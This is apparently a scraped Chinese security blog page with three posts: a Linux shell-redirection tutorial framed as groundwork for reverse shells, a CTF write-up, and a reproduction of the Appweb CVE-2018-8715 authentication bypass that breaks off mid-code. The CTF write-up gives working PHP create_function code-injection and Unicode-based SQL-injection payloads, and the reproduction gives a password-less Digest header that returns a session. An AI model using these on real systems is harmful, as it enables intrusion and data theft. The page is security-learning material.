    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/ctf/">ctf</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/05/25/OS/shell的重定向/"><span>Linux常用指令及其含义</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/05/25/OS/shell的重定向/" rel="bookmark">
        <time class="entry-date published" datetime="2019-05-25T13:45:08.302Z">
          2019-05-25
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="shell的重定向"><a href="#shell的重定向" class="headerlink" title="shell的重定向"></a>shell的重定向</h1><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p>Linux启动的时候会默认打开三个文件描述符，分别是：</p>
<table>
<thead>
<tr>
<th style="text-align:center">文件描述符</th>
<th style="text-align:center">缩写</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">STDIN</td>
<td style="text-align:center">标准输入</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">STDOUT</td>
<td style="text-align:center">标准输出</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">STDERR</td>
<td style="text-align:center">标准错误输出</td>
</tr>
</tbody>
</table>
<blockquote>
<p>标准输入standard input 0 （默认设备键盘）<br>标准输出standard output 1（默认设备显示器）<br>错误输出：error output 2（默认设备显示器）</p>
</blockquote>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d73c1264-9c80-1.png" alt=""></p>
<p><strong>注意：</strong></p>
<blockquote>
<p>（1）以后再打开文件，描述符可以依次增加<br>（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</p>
</blockquote>
<p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p>
<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>重定向列表如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">命令</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">command &gt; file</td>
<td style="text-align:center">将输出重定向到 file。</td>
</tr>
<tr>
<td style="text-align:center">command &lt; file</td>
<td style="text-align:center">将输入重定向到 file。</td>
</tr>
<tr>
<td style="text-align:center">command &gt;&gt; file</td>
<td style="text-align:center">将输出以追加的方式重定向到 file。</td>
</tr>
<tr>
<td style="text-align:center">n &gt; file</td>
<td style="text-align:center">将文件描述符为 n 的文件重定向到 file。</td>
</tr>
<tr>
<td style="text-align:center">n &gt;&gt; file</td>
<td style="text-align:center">将文件描述符为 n 的文件以追加的方式重定向到 file。</td>
</tr>
<tr>
<td style="text-align:center">n &gt;&amp; m</td>
<td style="text-align:center">将输出文件 m 和 n 合并。</td>
</tr>
<tr>
<td style="text-align:center">n &lt;&amp; m</td>
<td style="text-align:center">将输入文件 m 和 n 合并。</td>
</tr>
<tr>
<td style="text-align:center">&lt;&lt; tag</td>
<td style="text-align:center">将开始标记 tag 和结束标记 tag 之间的内容作为输入。</td>
</tr>
</tbody>
</table>
<p>1.bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p>
<p>2.如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是<strong>从左向右</strong>解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
<p>3.<code>&lt;</code> 是对标准输入 <code>0</code> 重定向 ，<code>&gt;</code> 是对标准输出 <code>1</code> 重定向</p>
<p>4.重定向就是针对文件描述符的操作</p>
<h3 id="1-输入重定向"><a href="#1-输入重定向" class="headerlink" title="1.输入重定向"></a>1.输入重定向</h3><p>格式： <code>[n]&lt; word （注意[n]与&lt;之间没有空格）</code><br>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d749a4e2-9c80-1.png" alt=""></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d7566fc4-9c80-1.png" alt=""></p>
<p>另一个例子：<br>统计<code>file</code>文件的有效行数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wc -l file</span><br><span class="line">1 file</span><br></pre></td></tr></table></figure></p>
<p>利用<code>&lt;</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wc -l &lt; file</span><br><span class="line">1</span><br></pre></td></tr></table></figure></p>
<p><strong>第一个例子，会输出文件名；第二个不会，因为它仅仅知道从标准输入读取内容</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 &lt; infile &gt; outfile</span><br></pre></td></tr></table></figure>
<p>同时替换输入和输出，执行command1，从文件infile读取内容，然后将输出写入到outfile中</p>
<p>解释: 解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。<strong>(有没有觉得这个其实就是C语言中的指针或者文件句柄，就是将0这个指针指向了不同的地址，自然有不同的输入)</strong></p>
<h3 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2.输出重定向"></a>2.输出重定向</h3><p>格式： <code>[n]&gt; word</code><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180810173621-d774b3bc-9c80-1.png" alt=""></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d77f7b1c-9c80-1.png" alt=""></p>
<p>说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）</p>
<h3 id="3-标准输出与标准错误输出重定向"><a href="#3-标准输出与标准错误输出重定向" class="headerlink" title="3.标准输出与标准错误输出重定向"></a>3.标准输出与标准错误输出重定向</h3><p>格式： <code>&amp;&gt; word &gt;&amp; word</code></p>
<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 <code>&gt; word 2&gt;&amp;1</code> (<code>2&gt;&amp;1</code> 是将标准错误输出复制到标准输出，<code>&amp;</code>是为了区分文件1和文件描述符1的，详细的介绍后面会有)</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d79df60a-9c80-1.png" alt=""></p>
<p>解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。</p>
<h3 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4.文件描述符的复制"></a>4.文件描述符的复制</h3><p>格式： <code>[n]&lt;&amp;[m] / [n]&gt;&amp;[m] (这里所有字符之间不要有空格)</code></p>
<p>说明：</p>
<p>1）这里<strong>两个都是将文件描述符 n 复制到 m </strong>，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p>
<p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p>
<p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p>
<p>这里就可以用上面的例子作为演示，将错误和正确的输出都输入到文件中</p>
<h3 id="重点："><a href="#重点：" class="headerlink" title="重点："></a>重点：</h3><p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p>
<p>(1)cmd &gt; file 2&gt;&amp;1<br>(2)cmd 2&gt;&amp;1 &gt;file</p>
<p>与第一条指令类似的指令在上面我已经介绍过了，我们现在就来看看第二条指令的执行过程</p>
<p><strong>1.首先解析器解析到 2&gt;&amp;1</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d7bcbb94-9c80-1.png" alt=""></p>
<p><strong>2.解析器再向后解析到 “&gt;”</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d7cdb7be-9c80-1.png" alt=""></p>
<h3 id="5-exec-绑定重定向"><a href="#5-exec-绑定重定向" class="headerlink" title="5.exec 绑定重定向"></a>5.exec 绑定重定向</h3><p>格式：<code>exec [n] &lt;/&gt; file/[n]</code></p>
<p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p>
<h3 id="重点：-1"><a href="#重点：-1" class="headerlink" title="重点："></a>重点：</h3><p>格式： <code>[n]&lt;&gt;word</code></p>
<p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d7da9894-9c80-1.png" alt=""></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180810173622-d7e99074-9c80-1.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上述将是反弹shell的基础</p>
<p>reference：<br><a href="https://www.runoob.com/linux/linux-shell-io-redirections.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-shell-io-redirections.html</a><br><a href="https://xz.aliyun.com/t/2548#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/2548#toc-0</a><br><a href="https://www.cnblogs.com/alan666/p/8311890.html" target="_blank" rel="noopener">https://www.cnblogs.com/alan666/p/8311890.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/shell/">shell</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/05/20/web/Code-Breaking Puzzles/"><span></span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/05/20/web/Code-Breaking Puzzles/" rel="bookmark">
        <time class="entry-date published" datetime="2019-05-20T14:35:03.799Z">
          2019-05-20
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="Code-Breaking-Puzzles"><a href="#Code-Breaking-Puzzles" class="headerlink" title="Code-Breaking Puzzles"></a>Code-Breaking Puzzles</h1><h2 id="function"><a href="#function" class="headerlink" title="function"></a>function</h2><p>审计代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>??是PHP7版本的新特性，它与?:的区别在哪里呢</p>
<p>？？</p>
<p>$b = $a?? $c ;相当于$b= isset($a)?$a:$c;</p>
<p>?:</p>
<p>$b = $a?$a: $c 则是 $b = ！empty($a) ? $a:$c;</p>
</blockquote>
<p>所以要绕过正则表达式以得到命令执行<br>这里可以利用<code>create_function</code></p>
<blockquote>
<p>PHP中使用create_function()创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令。</p>
</blockquote>
<p>create_function用法</p>
<blockquote>
<p>create_function ( string $args , string $code ) : string</p>
<p><strong>args</strong><br>The function arguments.<br><strong>code</strong><br>The function code. </p>
<p>返回值 </p>
<p>Returns a unique function name as a string, or FALSE on error. </p>
</blockquote>
<p>我们可以利用<code>\</code>绕过，也就是<code>%5c</code>，payload：<br><code>action=%5ccreate_function&amp;arg=;}phpinfo();//</code></p>
<p>加<code>\</code>可以成功的原因是：</p>
<blockquote>
<p>在名称前加上前缀 \ 表示该名称是全局空间中的名称，即使该名称位于其它的命名空间中时也是如此</p>
</blockquote>
<p>例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace A\B\C;</span><br><span class="line"></span><br><span class="line">/* 这个函数是 A\B\C\fopen */</span><br><span class="line">function fopen() &#123; </span><br><span class="line">     /* ... */</span><br><span class="line">     $f = \fopen(...); // 调用全局的fopen函数</span><br><span class="line">     return $f;</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>因为禁用了系统命令函数，所以可以利用<code>scandir（）</code>，获取目录下文件：<code>arg=;}print_r (scandir(&quot;/var/www/&quot;));//</code></p>
<p>结果：</p>
<blockquote>
<p>Array ( [0] =. [1] =.. [2] =flag_h0w2execute_arb1trary_c0de [3] =html ) </p>
</blockquote>
<p>所以可以得到flag：<code>arg=;}readfile(&quot;/var/www/flag_h0w2execute_arb1trary_c0de&quot;);//</code>或者<code>arg=;}echo(file_get_contents(&quot;/var/www/flag_h0w2execute_arb1trary_c0de&quot;));//</code></p>
<h2 id="nodechr"><a href="#nodechr" class="headerlink" title="nodechr"></a>nodechr</h2><p><code>/source</code>查看源码，一个基于<code>koa</code>框架的site，关键代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">    if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\-\-)/is)) &#123;</span><br><span class="line">        return keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return undefined</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function login(ctx, next) &#123;</span><br><span class="line">    if(ctx.method == &apos;POST&apos;) &#123;</span><br><span class="line">        let username = safeKeyword(ctx.request.body[&apos;username&apos;])</span><br><span class="line">        let password = safeKeyword(ctx.request.body[&apos;password&apos;])</span><br><span class="line"></span><br><span class="line">        let jump = ctx.router.url(&apos;login&apos;)</span><br><span class="line">        if (username &amp;&amp; password) &#123;</span><br><span class="line">            let user = await ctx.db.get(`SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; = &apos;$&#123;username.toUpperCase()&#125;&apos; AND &quot;password&quot; = &apos;$&#123;password.toUpperCase()&#125;&apos;`)</span><br><span class="line"></span><br><span class="line">            if (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(&apos;admin&apos;)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = 303</span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        await ctx.render(&apos;index&apos;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为sql是基于sqlite，所以<code>#</code>用不了，要绕过<code>union</code>和<code>select</code>的限制，这时注意到<code>toUpperCase()</code>，他将输入的字符串转化为大写，但是js有一个一直未解决的问题就是对于<strong>Unicode</strong>字符的处理，这里有一篇文章：<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
<p>谈到了<code>&quot;ı&quot;.toUpperCase() == &#39;I&#39;，&quot;ſ&quot;.toUpperCase() == &#39;S&#39;。</code>，所以可以构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:0</span><br><span class="line">password:0&apos; unıon ſelect 1,flag,3 from flags where &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
<p>reference:<br><a href="https://www.jianshu.com/p/748749d38fb8" target="_blank" rel="noopener">https://www.jianshu.com/p/748749d38fb8</a><br><a href="http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/05/12/cve/CVE-2018-8715/"><span>CVE-2018-8715</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/05/12/cve/CVE-2018-8715/" rel="bookmark">
        <time class="entry-date published" datetime="2019-05-12T07:25:04.606Z">
          2019-05-12
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="CVE-2018-8715"><a href="#CVE-2018-8715" class="headerlink" title="CVE-2018-8715"></a>CVE-2018-8715</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>利用vulnhub的环境<br><code>docker-compose up -d</code>后台运行，端口设置不要改，默认<code>8080</code></p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="Appweb简介"><a href="#Appweb简介" class="headerlink" title="Appweb简介"></a>Appweb简介</h3><p>Appweb是一个嵌入式HTTP Web服务器，主要的设计思路是安全。这是直接集成到客户的应用和设备，便于开发和部署基于Web的应用程序和设备。它迅速（ 每秒处理3500多要求）而紧凑 ，其中包括支持动态网页制作，服务器端嵌入式脚本过程中的CGI ，可加载模块的SSL ，摘要式身份验证，虚拟主机， Apache样式配置，日志记录，单和多线程应用程序。它提供了大量的文档和示例。</p>
<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
<ul>
<li>basic 传统HTTP基础认证</li>
<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
<li>form 表单认证</li>
</ul>
<h3 id="漏洞原理及复现"><a href="#漏洞原理及复现" class="headerlink" title="漏洞原理及复现"></a>漏洞原理及复现</h3><p>我复现的时候并没有如他人所说需要重置<code>session</code>，直接添加：<code>Authorization: Digest username=joshua</code><br><img src="https://i.loli.net/2019/05/11/5cd6eb191bdb6.png" alt=""></p>
<p>正常步骤是：<br>在添加了<code>Authorization: Digest username=joshua</code>之后，因为我们没有传入密码字段，所以服务端出现错误，直接返回了<code>200</code>，且包含一个<code>session</code>，于是再附上<code>session</code>：<br><img src="https://img-blog.csdnimg.cn/20190212222013874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkzNjU2Ng==,size_16,color_FFFFFF,t_70" alt=""></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参<br>数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<p>漏洞位置在<a href="https://github.com/embedthis/appweb/blob/v7.0.2/paks/http/dist/httpLib.c" target="_blank" rel="noopener">appweb/paks/http/dist/httpLib.c</a></p>
<p>首先是<code>function authCondition()</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">    This condition is used to implement all user authentication for routes</span><br><span class="line"> */</span><br><span class="line">static int authCondition(HttpConn *conn, HttpRoute *route, HttpRouteOp *op)</span><br><span class="line">&#123;</span><br><span class="line">    HttpAuth    *auth;</span><br><span class="line">    cchar       *username, *password;</span><br><span class="line"></span><br><span class="line">    assert(conn);</span><br><span class="line">    assert(route);</span><br><span class="line"></span><br><span class="line">    auth = route-&gt;auth;</span><br><span class="line">    if (!auth || !auth-&gt;type) &#123;</span><br><span class="line">        /* Authentication not required */</span><br><span class="line">        return HTTP_ROUTE_OK;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!httpIsAuthenticated(conn)) &#123;</span><br><span class="line">        httpGetCredentials(conn, &amp;username, &amp;password);</span><br><span class="line">        if (!httpLogin(conn, username, password)) &#123;</span><br><span class="line">            if (!conn-&gt;tx-&gt;finalized) &#123;</span><br><span class="line">                if (auth &amp;&amp; auth-&gt;type) &#123;</span><br><span class="line">                    (auth-&gt;type-&gt;askLogin)(conn);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    httpError(conn, HTTP_CODE_UNAUTHORIZED, &quot;Access Denied, login required&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                /* Request has been denied and a response generated. So OK to accept this route. */</span><br><span class="line">            &#125;</span><br><span class="line">            return HTTP_ROUTE_OK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!httpCanUser(conn, NULL)) &#123;</span><br><span class="line">        httpTrace(conn, &quot;auth.check&quot;, &quot;error&quot;, &quot;msg:&apos;Access denied, user is not authorized for access&apos;&quot;);</span><br><span class="line">        if (!conn-&gt;tx-&gt;finalized) &#123;</span><br><span class="line">            httpError(conn, HTTP_CODE_FORBIDDEN, &quot;Access denied. User is not authorized for access.&quot;);</span><br><span class="line">            /* Request has been denied and a response generated. So OK to accept this route. */</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /* OK to accept route. This does not mean the request was authenticated - an error may have been already generated */</span><br><span class="line">    return HTTP_ROUTE_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个函数负责调用两个用于认证处理的函数：<code>getCredentials</code>和<code>httpLogin</code>，注意到<code>httpGetCredentials</code>周围缺少检查，这将会在稍后起到作用</p>
<p><code>httpGetCredentials()</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">    Get the username and password credentials. If using an in-protocol auth scheme like basic|digest, the</span><br><span class="line">    rx-&gt;authDetails will contain the credentials and the parseAuth callback will be invoked to parse.</span><br><span class="line">    Otherwise, it is expected that &quot;username&quot; and &quot;password&quot; fields are present in the request parameters.</span><br><span class="line">    This is called by authCondition which thereafter calls httpLogin</span><br><span class="line"> */</span><br><span class="line">PUBLIC bool httpGetCredentials(HttpConn *conn, cchar **username, cchar **password)</span><br><span class="line">&#123;</span><br><span class="line">    HttpAuth    *auth;</span><br><span class="line"></span><br><span class="line">    assert(username);</span><br><span class="line">    assert(password);</span><br><span class="line">    *username = *password = NULL;</span><br><span class="line"></span><br><span class="line">    auth = conn-&gt;rx-&gt;route-&gt;auth;</span><br><span class="line">    if (!auth || !auth-&gt;type) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (auth-&gt;type) &#123;</span><br><span class="line">        if (conn-&gt;authType &amp;&amp; !smatch(conn-&gt;authType, auth-&gt;type-&gt;name)) &#123;</span><br><span class="line">            if (!(smatch(auth-&gt;type-&gt;name, &quot;form&quot;) &amp;&amp; conn-&gt;rx-&gt;flags &amp; HTTP_POST)) &#123;</span><br><span class="line">                /* If a posted form authentication, ignore any basic|digest details in request */</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (auth-&gt;type-&gt;parseAuth &amp;&amp; (auth-&gt;type-&gt;parseAuth)(conn, username, password) &lt; 0) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        *username = httpGetParam(conn, &quot;username&quot;, 0);</span><br><span class="line">        *password = httpGetParam(conn, &quot;password&quot;, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>该函数接收两个指向数组的指针用于从请求中解析<code>username</code>和<code>password</code>。既然<code>authCondition</code>没有进行参数检查，那么<code>parseAuth</code>失败也无关紧要。这意味着我们能够插入<code>WWW-Authenticate header</code>或者post任何我们想要的认证数据</p>
<p><code>httpLogin()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">    Login the user and create an authenticated session state store</span><br><span class="line"> */</span><br><span class="line">PUBLIC bool httpLogin(HttpConn *conn, cchar *username, cchar *password)</span><br><span class="line">&#123;</span><br><span class="line">    HttpRx          *rx;</span><br><span class="line">    HttpAuth        *auth;</span><br><span class="line">    HttpSession     *session;</span><br><span class="line">    HttpVerifyUser  verifyUser;</span><br><span class="line"></span><br><span class="line">    rx = conn-&gt;rx;</span><br><span class="line">    auth = rx-&gt;route-&gt;auth;</span><br><span class="line">    if (!username || !*username) &#123;</span><br><span class="line">        httpTrace(conn, &quot;auth.login.error&quot;, &quot;error&quot;, &quot;msg:&apos;missing username&apos;&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!auth-&gt;store) &#123;</span><br><span class="line">        mprLog(&quot;error http auth&quot;, 0, &quot;No AuthStore defined&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if ((verifyUser = auth-&gt;verifyUser) == 0) &#123;</span><br><span class="line">        if 